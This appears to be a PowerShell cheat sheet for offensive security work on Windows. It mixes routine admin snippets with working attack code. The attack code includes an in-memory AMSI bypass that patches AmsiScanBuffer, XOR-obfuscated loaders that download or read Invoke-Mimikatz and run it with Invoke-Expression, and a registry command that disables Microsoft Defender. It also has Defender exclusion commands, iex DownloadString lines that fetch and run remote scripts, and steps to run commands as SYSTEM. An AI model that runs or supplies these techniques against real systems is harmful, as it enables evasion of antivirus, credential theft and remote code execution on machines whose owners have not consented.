# Patching amsi.dll AmsiScanBuffer by rasta-mouse
```powershell
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```
- [AMSI.fail](https://amsi.fail/)
- [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- [A Detailed Guide on AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/)
- [Small modification to Rastemouse's AmsiScanBuffer bypass to use bytes.](https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998)

# Enable support of TLS 1.2
```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
```

# Download a script from an HTTP server
```powershell
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/microsoft/ExPerfAnalyzer/main/ExPerfAnalyzer.ps1')
```

# Test on open/close port
```powershell
Test-NetConnection -Port 389 -InformationLevel "Detailed" [ip]
```

## Use a data structure for frequently used options
```powershell
$Parameters = @{
	"Port" = "389"
	"InformationLevel" = "Detailed"
	"ComputerName" = "localhost"
}
Test-NetConnection @Parameters
```

- [Test-NetConnection](https://docs.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection)

# Payload encryption/decryption
## Encryption (cryptographically insecure)
```powershell
$FileIn = "C:\Windows\System32\calc.exe"
$FileOut = "C:\calc.exe.encrypted"
$Seed = 42 # seed between 0 and 2147483647

$Bytes = [io.file]::ReadAllBytes($FileIn) # Get-Content -Path $File -Encoding byte -Raw 

Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
for($i=0;$i -lt $Bytes.Length;$i++)
{
    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
}

[io.file]::WriteAllBytes($FileOut,$Bytes)
```
## Decryption
```powershell
$FileIn = "C:\calc.exe.encrypted"
$FileOut = "C:\calc.exe"
$Seed = 42 # seed between 0 and 2147483647

$Bytes = [io.file]::ReadAllBytes($FileIn) # Get-Content -Path $File -Encoding byte -Raw 

Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
for($i=0;$i -lt $Bytes.Length;$i++)
{
    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
}

[io.file]::WriteAllBytes($FileOut,$Bytes)
```

### Decrypt and invoke Invoke-Mimikatz.ps1 in PowerShell
```powershell
$Bytes = (New-Object Net.WebClient).DownloadData('https://github.com/' + 'okazymyrov/piki' + '/blob/master/Invoke' + '-Mimi' + 'katz.ps1.encrypted?raw=true')
$Seed = 42 # seed between 0 and 2147483647

Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
for($i=0;$i -lt $Bytes.Length;$i++)
{
    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
}

Invoke-Expression $([System.Text.Encoding]::ASCII.GetString($Bytes))
```

### Decrypt and invoke Invoke-Mimikatz.ps1 in PowerShell
```powershell
$Bytes = (New-Object Net.WebClient).DownloadData('https://github.com/okazymyrov/piki/blob/master/Invoke-Mimikatz.ps1.encrypted?raw=true')
$Seed = 42 # seed between 0 and 2147483647

Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
for($i=0;$i -lt $Bytes.Length;$i++)
{
    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
}

Invoke-Expression $([System.Text.Encoding]::ASCII.GetString($Bytes))
```

### Decrypt and invoke Invoke-Mimikatz.ps1 from the disk
```powershell
$FileIn = "C:\Users\Administrator\Downloads\Invoke-Mimikatz.ps1.encrypted"
$Seed = 42 # seed between 0 and 2147483647

$Bytes = [io.file]::ReadAllBytes($FileIn) # Get-Content -Path $File -Encoding byte -Raw 

Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
for($i=0;$i -lt $Bytes.Length;$i++)
{
    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
}

Invoke-Expression $([System.Text.Encoding]::ASCII.GetString($Bytes))
```

# Grep in PowerShell 

## Log files in the current directory
```powershell
Select-String -Path "*.log" -Pattern "EMAIL_ADDRESS"
```
- [How to Use PowerShell Grep (Select-String)](https://adamtheautomator.com/powershell-grep/)

## All files recursively
```powershell
Get-ChildItem -Recurse | Select-String -Pattern "EMAIL_ADDRESS" -List
```

# Search files based on a pattern
## On a local computer
```powershell
Get-ChildItem -Path "C:\Users\" -Recurse -File -ErrorAction SilentlyContinue -Include "*.txt"
```

## On an SMB share
```powershell
cd \\servername\foldername
Get-ChildItem -Path ".\" -Recurse -File -ErrorAction SilentlyContinue -Include "*.txt"
```

# Generate a 128-bit password
```powershell
New-Guid
```

# Connect to remote computer via WinRM
```powershell
$SecPassword = ConvertTo-SecureString "<password>" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("<domain.local>\<user>", $SecPassword)
New-PSSession -Credential $Cred -ComputerName <computer>.<domain.local>
```

# Manage Microsoft Defender for Endpoint

## [Add-MpPreference](https://learn.microsoft.com/en-us/powershell/module/defender/add-mppreference)

### Get information about current settings
```powershell
powershell -NonInteractive -Command Get-MpPreference
```

### Add exclusions (require administrative rights)
```powershell
powershell -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\tmp"
powershell -NonInteractive -Command Add-MpPreference -ExclusionProcess "java.exe"
```

## Disable Microsoft Defender
```powershell
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

## Check the state of Microsoft Defender
```powershell
Get-MpComputerStatus | select AMRunningMode
```

# Convert Base64 encoded string to hex
```powershell
(([System.Convert]::FromBase64String("<base64str>") | Format-Hex).Bytes | ForEach-Object {"{0:x}" -f $_}) -join ''
```

# Checks if the current Powershell instance is running with elevated privileges
## Option 1
```powershell
# https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=gui
(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```
## Option 2
```powershell
function IsAdmin {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal -ArgumentList $identity
        return $principal.IsInRole( [Security.Principal.WindowsBuiltInRole]::Administrator )
    } catch {
        throw "Failed to determine if the current user has elevated privileges. The error was: '{0}'." -f $_
    }
}; IsAdmin
```

# [Get-ADPrincipalKerberosTokenGroup](https://raw.githubusercontent.com/YossiSassi/Get-ADPrincipalKerberosTokenGroup/main/Get-ADPrincipalKerberosTokenGroup.ps1)
## Find user's group in the default AD
```powershell
Get-ADPrincipalKerberosTokenGroup <username>
```

# Get list of AD groups a user is a member of
```powershell
(New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=[username]))")).FindOne().GetDirectoryEntry().memberOf

```

# Run as SYSTEM
> [!WARNING]
> All commands requires **Administrator Privilege**. 
## [PowerRunAsSystem](https://github.com/DarkCoderSc/PowerRunAsSystem)

### Create a new PowerShell instance running under the context of ```NT AUTHORITY/SYSTEM```
```powershell
# iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DarkCoderSc/PowerRunAsSystem/main/PowerRunAsSystem/PowerRunAsSystem.psm1')
Invoke-InteractiveSystemPowerShell
```

### Run a command under the context of ```NT AUTHORITY/SYSTEM```
```powershell
# iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DarkCoderSc/PowerRunAsSystem/main/PowerRunAsSystem/PowerRunAsSystem.psm1')
Invoke-SystemCommand -Execute "powershell.exe" -Argument "whoami \| Out-File C:\result.txt"
```

# Export all X.509 certificates from all stores on localhost

```powershell
# Define a flat output directory for all certificates
$outputDir = ".\certs\"
New-Item -ItemType Directory -Force -Path $outputDir | Out-Null

# Define the registry locations for certificate stores
$storeLocations = @{
    "CurrentUser"  = "HKCU:\Software\Microsoft\SystemCertificates"
    "LocalMachine" = "HKLM:\Software\Microsoft\SystemCertificates"
}

# Build dynamic list of available stores
$stores = @()
foreach ($location in $storeLocations.Keys) {
    Get-ChildItem -Path $storeLocations[$location] | ForEach-Object {
        $stores += @{ Name = $_.PSChildName; Location = $location }
    }
}

# Track thumbprints to avoid overwriting duplicates
$exportedThumbprints = @{}

# Export certificates from all discovered stores
foreach ($store in $stores) {
    $storeName = $store.Name
    $storeLocation = $store.Location

    $storeObj = New-Object System.Security.Cryptography.X509Certificates.X509Store($storeName, $storeLocation)
    try {
        $storeObj.Open("ReadOnly")
    } catch {
        Write-Warning "Failed to open store $storeName at $storeLocation"
        continue
    }

    foreach ($cert in $storeObj.Certificates) {
        $thumbprint = $cert.Thumbprint.Replace(" ", "")
        
        # Skip if already exported
        if ($exportedThumbprints.ContainsKey($thumbprint)) {
            continue
        }

        $filename = Join-Path $outputDir "$thumbprint.cer"
        $bytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert)
        [System.IO.File]::WriteAllBytes($filename, $bytes)

        $exportedThumbprints[$thumbprint] = $true
    }

    $storeObj.Close()
}

Write-Output "`nAll certificates exported to: $outputDir"
```
